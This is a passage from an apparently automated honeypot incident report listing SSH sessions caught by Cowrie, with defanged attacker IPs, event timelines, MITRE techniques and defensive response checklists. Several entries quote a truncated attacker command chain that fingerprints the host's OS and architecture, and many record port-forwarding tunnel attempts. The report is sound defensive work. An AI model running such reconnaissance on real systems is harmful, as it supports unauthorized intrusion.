- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-357d47a7b8fb

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-07-21 18:25 |
| **Last Seen** | 2026-07-21 18:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:25:04` | `cowrie.session.connect` |
| `2026-07-21 18:25:04` | `cowrie.client.version` |
| `2026-07-21 18:25:04` | `cowrie.client.kex` |
| `2026-07-21 18:25:05` | `cowrie.login.success` |
| `2026-07-21 18:25:06` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f1d86ed0d1

| Field | Detail |
|---|---|
| **Source IP** | `116.53.130[.]4` |
| **First Seen** | 2026-07-21 18:25 |
| **Last Seen** | 2026-07-21 18:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:25:11` | `cowrie.session.connect` |
| `2026-07-21 18:25:12` | `cowrie.client.version` |
| `2026-07-21 18:25:12` | `cowrie.client.kex` |
| `2026-07-21 18:25:14` | `cowrie.login.success` |
| `2026-07-21 18:25:17` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.53.130[.]4` to AbuseIPDB if not already reported
- [ ] Block `116.53.130[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6af298aa034a

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-21 18:26 |
| **Last Seen** | 2026-07-21 18:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:26:34` | `cowrie.session.connect` |
| `2026-07-21 18:26:35` | `cowrie.client.version` |
| `2026-07-21 18:26:35` | `cowrie.client.kex` |
| `2026-07-21 18:26:36` | `cowrie.login.success` |
| `2026-07-21 18:26:37` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:26:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6346c1429c

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-21 18:28 |
| **Last Seen** | 2026-07-21 18:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:28:01` | `cowrie.session.connect` |
| `2026-07-21 18:28:01` | `cowrie.client.version` |
| `2026-07-21 18:28:01` | `cowrie.client.kex` |
| `2026-07-21 18:28:02` | `cowrie.login.success` |
| `2026-07-21 18:28:03` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:28:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ca1a54a9df

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:28 |
| **Last Seen** | 2026-07-21 18:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:28:24` | `cowrie.session.connect` |
| `2026-07-21 18:28:25` | `cowrie.client.version` |
| `2026-07-21 18:28:27` | `cowrie.client.kex` |
| `2026-07-21 18:28:32` | `cowrie.login.success` |
| `2026-07-21 18:28:33` | `cowrie.session.params` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:33` | `cowrie.command.success` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:33` | `cowrie.command.input` |
| `2026-07-21 18:28:34` | `cowrie.command.input` |
| `2026-07-21 18:28:34` | `cowrie.command.input` |
| `2026-07-21 18:28:34` | `cowrie.log.closed` |
| `2026-07-21 18:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77ad69c13c58

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:31 |
| **Last Seen** | 2026-07-21 18:32 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:31:47` | `cowrie.session.connect` |
| `2026-07-21 18:31:49` | `cowrie.client.version` |
| `2026-07-21 18:31:49` | `cowrie.client.kex` |
| `2026-07-21 18:31:58` | `cowrie.login.success` |
| `2026-07-21 18:32:01` | `cowrie.session.params` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.success` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:01` | `cowrie.command.input` |
| `2026-07-21 18:32:03` | `cowrie.log.closed` |
| `2026-07-21 18:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851e40877eed

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:35 |
| **Last Seen** | 2026-07-21 18:35 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:35:09` | `cowrie.session.connect` |
| `2026-07-21 18:35:11` | `cowrie.client.version` |
| `2026-07-21 18:35:11` | `cowrie.client.kex` |
| `2026-07-21 18:35:18` | `cowrie.login.success` |
| `2026-07-21 18:35:24` | `cowrie.session.params` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.success` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:24` | `cowrie.command.input` |
| `2026-07-21 18:35:26` | `cowrie.log.closed` |
| `2026-07-21 18:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213a9554a49a

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-07-21 18:35 |
| **Last Seen** | 2026-07-21 18:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:35:36` | `cowrie.session.connect` |
| `2026-07-21 18:35:36` | `cowrie.client.version` |
| `2026-07-21 18:35:36` | `cowrie.client.kex` |
| `2026-07-21 18:35:40` | `cowrie.login.success` |
| `2026-07-21 18:35:41` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efcfec9db08b

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-07-21 18:35 |
| **Last Seen** | 2026-07-21 18:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:35:46` | `cowrie.session.connect` |
| `2026-07-21 18:35:47` | `cowrie.client.version` |
| `2026-07-21 18:35:47` | `cowrie.client.kex` |
| `2026-07-21 18:35:49` | `cowrie.login.success` |
| `2026-07-21 18:35:50` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:35:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.245[.]120` to AbuseIPDB if not already reported
- [ ] Block `60.223.245[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2aef43ab2a55

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 18:36 |
| **Last Seen** | 2026-07-21 18:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:36:07` | `cowrie.session.connect` |
| `2026-07-21 18:36:07` | `cowrie.client.version` |
| `2026-07-21 18:36:07` | `cowrie.client.kex` |
| `2026-07-21 18:36:08` | `cowrie.login.success` |
| `2026-07-21 18:36:08` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:36:08` | `cowrie.direct-tcpip.data` |
| `2026-07-21 18:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5d9b7ddfd70

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:38 |
| **Last Seen** | 2026-07-21 18:38 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:38:14` | `cowrie.session.connect` |
| `2026-07-21 18:38:15` | `cowrie.client.version` |
| `2026-07-21 18:38:15` | `cowrie.client.kex` |
| `2026-07-21 18:38:23` | `cowrie.login.success` |
| `2026-07-21 18:38:25` | `cowrie.session.params` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.success` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:25` | `cowrie.command.input` |
| `2026-07-21 18:38:29` | `cowrie.log.closed` |
| `2026-07-21 18:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abfe8f090d9d

| Field | Detail |
|---|---|
| **Source IP** | `178.216.165[.]187` |
| **First Seen** | 2026-07-21 18:38 |
| **Last Seen** | 2026-07-21 18:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:38:56` | `cowrie.session.connect` |
| `2026-07-21 18:38:56` | `cowrie.client.version` |
| `2026-07-21 18:38:56` | `cowrie.client.kex` |
| `2026-07-21 18:38:57` | `cowrie.login.success` |
| `2026-07-21 18:38:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.216.165[.]187` to AbuseIPDB if not already reported
- [ ] Block `178.216.165[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e247a2f47d2a

| Field | Detail |
|---|---|
| **Source IP** | `117.191.83[.]250` |
| **First Seen** | 2026-07-21 18:39 |
| **Last Seen** | 2026-07-21 18:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:39:03` | `cowrie.session.connect` |
| `2026-07-21 18:39:04` | `cowrie.client.version` |
| `2026-07-21 18:39:04` | `cowrie.client.kex` |
| `2026-07-21 18:39:06` | `cowrie.login.success` |
| `2026-07-21 18:39:07` | `cowrie.direct-tcpip.request` |
| `2026-07-21 18:39:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.191.83[.]250` to AbuseIPDB if not already reported
- [ ] Block `117.191.83[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb306c960a7c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:41 |
| **Last Seen** | 2026-07-21 18:42 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:41:42` | `cowrie.session.connect` |
| `2026-07-21 18:41:45` | `cowrie.client.version` |
| `2026-07-21 18:41:45` | `cowrie.client.kex` |
| `2026-07-21 18:41:53` | `cowrie.login.success` |
| `2026-07-21 18:41:57` | `cowrie.session.params` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.success` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:57` | `cowrie.command.input` |
| `2026-07-21 18:41:59` | `cowrie.log.closed` |
| `2026-07-21 18:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efc34a1bfdde

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 18:43 |
| **Last Seen** | 2026-07-21 18:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:43:59` | `cowrie.session.connect` |
| `2026-07-21 18:43:59` | `cowrie.client.version` |
| `2026-07-21 18:43:59` | `cowrie.client.kex` |
| `2026-07-21 18:43:59` | `cowrie.login.success` |
| `2026-07-21 18:43:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a4e885839f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 18:44 |
| **Last Seen** | 2026-07-21 18:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:44:00` | `cowrie.session.connect` |
| `2026-07-21 18:44:00` | `cowrie.client.version` |
| `2026-07-21 18:44:00` | `cowrie.client.kex` |
| `2026-07-21 18:44:00` | `cowrie.login.success` |
| `2026-07-21 18:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c97d758df48

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 18:44 |
| **Last Seen** | 2026-07-21 18:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:44:08` | `cowrie.session.connect` |
| `2026-07-21 18:44:08` | `cowrie.client.version` |
| `2026-07-21 18:44:08` | `cowrie.client.kex` |
| `2026-07-21 18:44:08` | `cowrie.login.success` |
| `2026-07-21 18:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ab48d75d40

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-21 18:44 |
| **Last Seen** | 2026-07-21 18:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:44:08` | `cowrie.session.connect` |
| `2026-07-21 18:44:08` | `cowrie.client.version` |
| `2026-07-21 18:44:08` | `cowrie.client.kex` |
| `2026-07-21 18:44:09` | `cowrie.login.success` |
| `2026-07-21 18:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab6433dedf3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:44 |
| **Last Seen** | 2026-07-21 18:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 18:44:55` | `cowrie.session.connect` |
| `2026-07-21 18:44:56` | `cowrie.client.version` |
| `2026-07-21 18:44:56` | `cowrie.client.kex` |
| `2026-07-21 18:45:00` | `cowrie.login.success` |
| `2026-07-21 18:45:02` | `cowrie.session.params` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.success` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:02` | `cowrie.command.input` |
| `2026-07-21 18:45:03` | `cowrie.log.closed` |
| `2026-07-21 18:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8433e7b0fdf8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-21 18:48 |
| **Last Seen** | 2026-07-21 18:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
